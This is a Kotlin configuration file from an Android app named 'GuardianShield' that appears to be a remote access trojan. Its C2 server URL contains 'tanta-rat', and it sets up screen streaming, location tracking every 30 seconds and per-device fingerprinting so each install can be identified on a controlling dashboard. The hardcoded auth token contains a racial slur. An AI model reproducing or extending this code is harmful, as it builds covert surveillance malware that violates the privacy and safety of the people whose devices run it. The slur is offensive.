package com.guardianshield.app

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import java.security.MessageDigest
import java.util.UUID

/**
 * Centralized configuration singleton.
 *
 * The SERVER_URL and AUTH_TOKEN are embedded at build time.
 * Each APK install auto-generates a unique device fingerprint based on
 * device properties + a random UUID, ensuring every install is uniquely
 * identifiable on the dashboard.
 */
object Config {

    private const val PREFS_NAME = "guardianshield_config"
    private const val KEY_DEVICE_ID = "device_id"
    private const val KEY_FIRST_INSTALL_TIME = "first_install_time"

    // ============================================================
    // BUILD-TIME CONFIGURATION
    // Set these before building the APK. They will be embedded.
    // ============================================================

    /** Railway backend URL — set this to your Railway deployment URL */
    const val SERVER_URL = "https://tanta-rat-production.up.railway.app"

    /** Auth token — must match the AUTH_TOKEN env var on Railway */
    const val AUTH_TOKEN = "niggajiggaFuckhismigaligachicha"

    // ============================================================
    // STREAMING SETTINGS
    // ============================================================

    /** Target frames per second for screen streaming */
    var streamFps: Int = 30

    /** WebP compression quality (0-100). 60 = good balance */
    var streamQuality: Int = 60

    /** Resolution scale factor. 0.5 = half resolution for bandwidth savings */
    var streamScale: Float = 0.5f

    /** Location update interval in milliseconds */
    var locationIntervalMs: Long = 30_000L

    // ============================================================
    // DEVICE IDENTITY (auto-generated)
    // ============================================================

    /** Unique device fingerprint — generated on first launch */
    var deviceId: String = ""
        private set

    /** Human-readable device label for the dashboard */
    var deviceLabel: String = ""
        private set

    /**
     * Initialize config — MUST be called on app start.
     * Generates a unique device fingerprint on first launch.
     */
    fun init(context: Context) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

        // Generate stable device fingerprint on first launch
        deviceId = prefs.getString(KEY_DEVICE_ID, null) ?: run {
            val fingerprint = generateFingerprint()
            prefs.edit()
                .putString(KEY_DEVICE_ID, fingerprint)
                .putLong(KEY_FIRST_INSTALL_TIME, System.currentTimeMillis())
                .apply()
            fingerprint
        }

        // Create human-readable label: "Samsung Galaxy S21 (a3f2)"
        val shortId = deviceId.takeLast(4)
        deviceLabel = "${Build.MANUFACTURER} ${Build.MODEL} ($shortId)"
    }

    /**
     * Generate a unique device fingerprint.
     *
     * Combines device hardware properties with a random UUID to ensure
     * uniqueness even across factory-reset devices or identical models.
     * The fingerprint is a SHA-256 hash truncated to 16 hex chars.
     */
    private fun generateFingerprint(): String {
        val raw = buildString {
            append(UUID.randomUUID().toString())
            append(Build.BOARD)
            append(Build.BRAND)
            append(Build.DEVICE)
            append(Build.HARDWARE)
            append(Build.MODEL)
            append(Build.SERIAL)
            append(System.currentTimeMillis())
        }

        val digest = MessageDigest.getInstance("SHA-256")
        val hash = digest.digest(raw.toByteArray())
        return hash.joinToString("") { "%02x".format(it) }.take(16)
    }

    /**
     * Check if the build-time config has been set (not default placeholders).
     */
    fun isConfigured(): Boolean {
        return SERVER_URL != "https://your-app-name.up.railway.app"
            && AUTH_TOKEN != "your-secret-token-here"
    }
}
